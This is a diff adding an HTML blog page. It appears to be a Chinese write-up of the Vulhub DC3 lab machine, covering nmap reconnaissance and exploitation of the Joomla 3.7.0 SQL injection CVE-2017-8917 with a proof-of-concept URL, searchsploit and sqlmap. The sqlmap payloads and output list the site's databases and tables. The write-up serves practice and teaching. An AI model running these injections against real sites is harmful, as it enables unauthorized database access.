@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Vulhub DC3 靶场 | w8nn9z Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="Vulhub DC3 靶场 - w8nn9z Blog">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/penetration/vulhubdc3/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="sha256-EqVinQvl&#43;IX9lG13JX5V90An7So1FEop4tsT&#43;PYrXzU=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/penetration/vulhubdc3/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/search" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/posts" title="文章">
+                    <span>文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Vulhub DC3 靶场
+    </h1>
+    <div class="post-meta"><span title='2025-09-26 00:00:00 +0000 UTC'>September 26, 2025</span>
+
+</div>
+  </header> 
+
+  <div class="post-content"><p>nmap扫描开放端口及服务：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap 61.139.2.0/24
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 61.139.2.136
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00096s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">999</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp open  http
+</span></span></code></pre></div><p>全面扫描：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -A -p 1-65535 61.139.2.136
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-09-26 10:39 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 61.139.2.136
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00096s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65534</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-generator: Joomla! - Open Source Content Management
+</span></span><span style="display:flex;"><span>|_http-title: Home
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>访问web服务：</p>
+<p><img alt="alt" loading="lazy" src="/images/Vulhub/4.png"></p>
+<p>获取版本信息<code>/administrator/manifests/files/joomla.xml</code>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;extension</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;3.6&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;file&#34;</span> <span style="color:#a6e22e">method=</span><span style="color:#e6db74">&#34;upgrade&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;name&gt;</span>files_joomla<span style="color:#f92672">&lt;/name&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;author&gt;</span>Joomla! Project<span style="color:#f92672">&lt;/author&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;authorEmail&gt;</span>admin@joomla.org<span style="color:#f92672">&lt;/authorEmail&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;authorUrl&gt;</span>www.joomla.org<span style="color:#f92672">&lt;/authorUrl&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;copyright&gt;</span>
+</span></span><span style="display:flex;"><span>(C) 2005 - 2017 Open Source Matters. All rights reserved
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/copyright&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;license&gt;</span>
+</span></span><span style="display:flex;"><span>GNU General Public License version 2 or later; see LICENSE.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/license&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;version&gt;</span>3.7.0<span style="color:#f92672">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;creationDate&gt;</span>April 2017<span style="color:#f92672">&lt;/creationDate&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;description&gt;</span>FILES_JOOMLA_XML_DESCRIPTION<span style="color:#f92672">&lt;/description&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;scriptfile&gt;</span>administrator/components/com_admin/script.php<span style="color:#f92672">&lt;/scriptfile&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;update&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;schemas&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;schemapath</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;mysql&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>administrator/components/com_admin/sql/updates/mysql
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/schemapath&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;schemapath</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;sqlsrv&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>administrator/components/com_admin/sql/updates/sqlazure
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/schemapath&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;schemapath</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;sqlazure&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>administrator/components/com_admin/sql/updates/sqlazure
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/schemapath&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;schemapath</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;postgresql&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>administrator/components/com_admin/sql/updates/postgresql
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/schemapath&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/schemas&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/update&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;fileset&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;files&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;folder&gt;</span>administrator<span style="color:#f92672">&lt;/folder&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;folder&gt;</span>bin<span style="color:#f92672">&lt;/folder&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;folder&gt;</span>cache<span style="color:#f92672">&lt;/folder&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;folder&gt;</span>cli<span style="color:#f92672">&lt;/folder&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;folder&gt;</span>components<span style="color:#f92672">&lt;/folder&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;folder&gt;</span>images<span style="color:#f92672">&lt;/folder&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;folder&gt;</span>includes<span style="color:#f92672">&lt;/folder&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;folder&gt;</span>language<span style="color:#f92672">&lt;/folder&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;folder&gt;</span>layouts<span style="color:#f92672">&lt;/folder&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;folder&gt;</span>libraries<span style="color:#f92672">&lt;/folder&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;folder&gt;</span>media<span style="color:#f92672">&lt;/folder&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;folder&gt;</span>modules<span style="color:#f92672">&lt;/folder&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;folder&gt;</span>plugins<span style="color:#f92672">&lt;/folder&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;folder&gt;</span>templates<span style="color:#f92672">&lt;/folder&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;folder&gt;</span>tmp<span style="color:#f92672">&lt;/folder&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;file&gt;</span>htaccess.txt<span style="color:#f92672">&lt;/file&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;file&gt;</span>web.config.txt<span style="color:#f92672">&lt;/file&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;file&gt;</span>LICENSE.txt<span style="color:#f92672">&lt;/file&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;file&gt;</span>README.txt<span style="color:#f92672">&lt;/file&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;file&gt;</span>index.php<span style="color:#f92672">&lt;/file&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/files&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/fileset&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;updateservers&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;server</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Joomla! Core&#34;</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;collection&#34;</span><span style="color:#f92672">&gt;</span>https://update.joomla.org/core/list.xml<span style="color:#f92672">&lt;/server&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/updateservers&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/extension&gt;</span>
+</span></span></code></pre></div><p>Joomla 3.7.0 (CVE-2017-8917) 存在SQL注入漏洞，poc：</p>
+<pre tabindex="0"><code>/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,user()),0)
+500 XPATH syntax error: &#39;&gt;root@localhost&#39; 
+</code></pre><p>使用searchsploit查找漏洞利用方法：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ searchsploit joomla 3.7.0    
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                                          |  Path
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style="display:flex;"><span>Joomla! 3.7.0 - <span style="color:#e6db74">&#39;com_fields&#39;</span> SQL Injection                                                                              | php/webapps/42033.txt
+</span></span><span style="display:flex;"><span>Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripting                                                           | php/webapps/43488.txt
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ cat /usr/share/exploitdb/exploits/php/webapps/42033.txt
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit Title: Joomla 3.7.0 - Sql Injection</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Date: 05-19-2017</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit Author: Mateus Lino</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Vendor Homepage: https://www.joomla.org/</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Version: = 3.7.0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># CVE : - CVE-2017-8917</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>URL Vulnerable: http://localhost/index.php?option<span style="color:#f92672">=</span>com_fields&amp;view<span style="color:#f92672">=</span>fields&amp;layout<span style="color:#f92672">=</span>modal&amp;list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]=</span>updatexml%27
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Using Sqlmap:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#34;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent --dbs -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Parameter: list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>GET<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Type: boolean-based blind
+</span></span><span style="display:flex;"><span>    Title: Boolean-based blind - Parameter replace <span style="color:#f92672">(</span>DUAL<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Payload: option<span style="color:#f92672">=</span>com_fields&amp;view<span style="color:#f92672">=</span>fields&amp;layout<span style="color:#f92672">=</span>modal&amp;list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]=(</span>CASE WHEN <span style="color:#f92672">(</span>1573<span style="color:#f92672">=</span>1573<span style="color:#f92672">)</span> THEN <span style="color:#ae81ff">1573</span> ELSE 1573*<span style="color:#f92672">(</span>SELECT <span style="color:#ae81ff">1573</span> FROM DUAL UNION SELECT <span style="color:#ae81ff">9674</span> FROM DUAL<span style="color:#f92672">)</span> END<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Type: error-based
+</span></span><span style="display:flex;"><span>    Title: MySQL &gt;<span style="color:#f92672">=</span> 5.0 error-based - Parameter replace <span style="color:#f92672">(</span>FLOOR<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Payload: option<span style="color:#f92672">=</span>com_fields&amp;view<span style="color:#f92672">=</span>fields&amp;layout<span style="color:#f92672">=</span>modal&amp;list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]=(</span>SELECT <span style="color:#ae81ff">6600</span> FROM<span style="color:#f92672">(</span>SELECT COUNT<span style="color:#f92672">(</span>*<span style="color:#f92672">)</span>,CONCAT<span style="color:#f92672">(</span>0x7171767071,<span style="color:#f92672">(</span>SELECT <span style="color:#f92672">(</span>ELT<span style="color:#f92672">(</span>6600<span style="color:#f92672">=</span>6600,1<span style="color:#f92672">)))</span>,0x716a707671,FLOOR<span style="color:#f92672">(</span>RAND<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>*2<span style="color:#f92672">))</span>x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x<span style="color:#f92672">)</span>a<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Type: AND/OR time-based blind
+</span></span><span style="display:flex;"><span>    Title: MySQL &gt;<span style="color:#f92672">=</span> 5.0.12 time-based blind - Parameter replace <span style="color:#f92672">(</span>substraction<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Payload: option<span style="color:#f92672">=</span>com_fields&amp;view<span style="color:#f92672">=</span>fields&amp;layout<span style="color:#f92672">=</span>modal&amp;list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]=(</span>SELECT * FROM <span style="color:#f92672">(</span>SELECT<span style="color:#f92672">(</span>SLEEP<span style="color:#f92672">(</span>5<span style="color:#f92672">)))</span>GDiu<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>利用sqlmap自动注入：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#34;http://61.139.2.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent --dbs -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sqlmap identified the following injection point<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> with a total of <span style="color:#ae81ff">4381</span> HTTP<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> requests:
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>Parameter: list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>GET<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Type: error-based
+</span></span><span style="display:flex;"><span>    Title: MySQL &gt;<span style="color:#f92672">=</span> 5.1 error-based - Parameter replace <span style="color:#f92672">(</span>UPDATEXML<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Payload: option<span style="color:#f92672">=</span>com_fields&amp;view<span style="color:#f92672">=</span>fields&amp;layout<span style="color:#f92672">=</span>modal&amp;list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]=(</span>UPDATEXML<span style="color:#f92672">(</span>4878,CONCAT<span style="color:#f92672">(</span>0x2e,0x717a766b71,<span style="color:#f92672">(</span>SELECT <span style="color:#f92672">(</span>ELT<span style="color:#f92672">(</span>4878<span style="color:#f92672">=</span>4878,1<span style="color:#f92672">)))</span>,0x7171717871<span style="color:#f92672">)</span>,5669<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:05:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> the back-end DBMS is MySQL
+</span></span><span style="display:flex;"><span>web server operating system: Linux Ubuntu 16.10 or 16.04 <span style="color:#f92672">(</span>yakkety or xenial<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>web application technology: Apache 2.4.18
+</span></span><span style="display:flex;"><span>back-end DBMS: MySQL &gt;<span style="color:#f92672">=</span> 5.1
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:05:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching database names
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:05:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: <span style="color:#e6db74">&#39;information_schema&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:05:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: <span style="color:#e6db74">&#39;joomladb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:05:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: <span style="color:#e6db74">&#39;mysql&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:05:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: <span style="color:#e6db74">&#39;performance_schema&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>11:05:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: <span style="color:#e6db74">&#39;sys&#39;</span>
+</span></span><span style="display:flex;"><span>available databases <span style="color:#f92672">[</span>5<span style="color:#f92672">]</span>:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> information_schema
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> joomladb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> mysql
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> performance_schema
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> sys
+</span></span></code></pre></div><p>获取<code>joomladb</code>下的表名：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#34;http://61.139.2.136/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34;</span> --risk<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> --level<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> --random-agent -D <span style="color:#e6db74">&#34;joomladb&#34;</span> --tables -p list<span style="color:#f92672">[</span>fullordering<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Database: joomladb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">76</span> tables<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+---------------------+
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__assets           |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__associations     |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__banner_clients   |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__banner_tracks    |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__banners          |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_admin       |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_books       |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_comments    |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_locations   |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_mediafiles  |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_message_typ |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_podcast     |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_series      |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_servers     |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_studies     |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_studytopics |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_teachers    |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_templatecod |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_templates   |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_timeset     |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_topics      |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__bsms_update      |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__categories       |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__contact_details  |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__content_frontpag |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__content_rating   |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__content_types    |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__content          |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__contentitem_tag_ |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__core_log_searche |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__extensions       |</span>
+</span></span><span style="display:flex;"><span>| <span style="color:#75715e">#__fields_categorie |</span>
